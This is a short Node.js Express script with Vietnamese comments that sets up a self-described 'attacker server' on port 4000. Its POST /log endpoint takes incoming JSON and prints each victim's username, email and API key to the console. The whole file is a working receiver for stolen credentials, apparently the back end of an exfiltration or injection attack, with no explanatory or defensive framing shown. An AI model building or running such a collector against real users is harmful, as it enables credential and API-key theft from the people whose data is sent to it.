const express = require("express");

const app = express();

const PORT = 4000;

app.use(express.json());

app.use(express.static("public"));

// ========================================
// Endpoint nhận dữ liệu
// ========================================

app.post("/log", (req, res) => {

    const data = req.body;

    console.log("");
    console.log("================================");
    console.log("       DATA RECEIVED");
    console.log("================================");

    console.log(
        "Username :",
        data.username
    );

    console.log(
        "Email    :",
        data.email
    );

    console.log(
        "API Key  :",
        data.apiKey
    );

    console.log("================================");
    console.log("");

    res.json({
        status: "received"
    });
});

// ========================================
// Start
// ========================================

app.listen(PORT, () => {

    console.log(
        `[+] Attacker server running at`
    );

    console.log(
        `    http://localhost:${PORT}`
    );
});